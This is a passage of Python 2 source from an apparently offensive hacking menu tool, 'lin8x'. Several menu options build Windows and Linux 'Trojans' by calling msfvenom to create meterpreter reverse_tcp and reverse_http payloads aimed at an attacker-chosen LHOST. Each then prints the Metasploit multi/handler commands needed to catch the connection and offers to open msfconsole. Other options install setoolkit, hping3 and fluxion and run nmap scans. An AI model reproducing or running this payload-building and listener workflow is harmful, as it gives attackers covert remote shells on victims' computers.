                subprocess.call(["python", "lin8x.py"])
        if v3 == '3':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Windows Trojan through reverse_http...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p windows/meterpreter/reverse_http LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk3 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk3 == '2':
                subprocess.call(["python", "lin8x.py"])
        if v3 == '4':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Windows Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p windows/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f rar > /root/Desktop/""" + name1 + """.rar""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk3 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk3 == '2':
                subprocess.call(["python", "lin8x.py"])
        if v3 == '99':
            subprocess.call(["python", "lin8x.py"])

############################################################

    if v == '4':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""

        print bcolors.green + """
	         _nnnn_
	        dGGGGMMb
	       @p~qp~~qMb
	       M|0||0) M|
	       @,----.JM|
	      JS^\__/  qKL
	     dZP        qKRb
	    dZP          qKKb
	   fZP            SMMb
	   HZM            MMMM
	   FqM            MMMM
	 __| ".        |\dS"qML
	 |    `.       | `' \Zq
	_)      \.___.,|     .'
	\____   )MMMMMP|   .'
	     `-'       `--' hjm
"""
     
        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .elf)"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

        print ""

        print bcolors.red + """############################################################
"""
        v3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if v3 == '1':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Linux Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p linux/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f elf > /root/Desktop/""" + name1 + """.elf""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload linux/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk3 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk3 == '2':
                subprocess.call(["python", "lin8x.py"])
        if v3 == '99':
            subprocess.call(["python", "lin8x.py"])

############################################################

    if v == '99':
        subprocess.call(["python", "lin8x.py"])

    else:
        subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "6":
    mac()

############################################################

elif answer == "95":
    print bcolors.red + """ Please wait while nmap installs """
    from time import sleep
    sleep(1)
    print bcolors.white
    os.system("sudo apt-get install nmap")
    os.system("sudo apt-get install msfvenom")
    os.system("sudo apt-get install setoolkit")
    os.system("sudo apt-get install msfconsole")
    os.system("sudo apt-get install hping3")
    os.system("git clone https:// github.com/wi-fi-analyzer/fluxion.git")
    subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "96":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
    """

    print bcolors.yellow + """Feel free to learn hacking at:
http://www.hackerhighschool.org
"""

    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

    print bcolors.red + """############################################################
    """
    six = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if six == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "97":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
    """
    print bcolors.green + """
	         _nnnn_
	        dGGGGMMb
	       @p~qp~~qMb
	       M|^||^) M|
	       @,----.JM|
	      JS^\__/  qKL
	     dZP        qKRb
	    dZP          qKKb
	   fZP            SMMb
	   HZM            MMMM
	   FqM            MMMM
	 __| ".        |\dS"qML
	 |    `.       | `' \Zq
	_)      \.___.,|     .'
	\____   )MMMMMP|   .'
	     `-'       `--' hjm
"""

    print bcolors.red + """############################################################
    """
    
    print bcolors.white + """          """ + bcolors.underline + """Developer List"""
    print bcolors.white + bcolors.bold + """
[Founder & Dev]       AnonymousContent
[Developer]           iByNiki_
[Developer]           AnonymousBen
[Supporter]           Devore07
[Supporter]           FCCAGut
"""
 
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""    

    print bcolors.red + """############################################################
    """

    cr = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if cr == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "98":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    os.system('sudo apt install git')
    os.system('sudo apt-get install git')
    os.system('git clone https://github.com/Lin8x/Lin8x')
    subprocess.call(["python", "lin8x.py"])

############################################################

elif answer == "99":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    os.kill(os.getppid(), signal.SIGHUP)

else:
    subprocess.call(["python", "lin8x.py"])
    

############################################################

class setoolkit:
    def __init__(self):
        self.installDir = toolDir + "setoolkit"
        self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"

        if not self.installed():
            self.install()
            self.run()
        else:
            print(alreadyInstalled)
            self.run()
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isfile("/usr/bin/setoolkit"))

    def install(self):
        os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
            python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && python setup.py install" % self.installDir)

    def run(self):
        os.system("setoolkit")

############################################################

class host2ip:
    host2ipLogo = '''
    88  88  dP"Yb  .dP"Y8 888888 oP"Yb. 88 88""Yb
    88  88 dP   Yb `Ybo."   88   "' dP' 88 88__dP
    888888 Yb   dP o.`Y8b   88     dP'  88 88"""
    88  88  YbodP  8bodP'   88   .d8888 88 88
    '''

    def __init__(self):
        clearScr()
        print(self.host2ipLogo)
        host = raw_input("   Enter a Host: ")
        ip = socket.gethostbyname(host)
        print("   %s has the IP of %s" % (host, ip))
        response = raw_input(continuePrompt)

############################################################

class nmap:
    nmapLogo = '''
    88b 88 8b    d8    db    88""Yb
    88Yb88 88b  d88   dPYb   88__dP
    88 Y88 88YbdP88  dP__Yb  88"""
    88  Y8 88 YY 88 dP""""Yb 88
    '''

    def __init__(self):
        self.installDir = toolDir + "nmap"
        self.gitRepo = "https://github.com/nmap/nmap.git"

        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && ./configure && make && make install" %
                  self.installDir)

    def run(self):
        clearScr()
        print(self.nmapLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nmapLogo)
        print("   Nmap scan for: %s\n" % target)
        print("   {1}--Simple Scan [-sV]")
        print("   {2}--Port Scan [-Pn]")
        print("   {3}--Operating System Detection [-A]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("nmap ~# ")
        clearScr()
        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("nmap -sV -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("nmap -Pn -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("nmap -A -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
                self.menu(target)
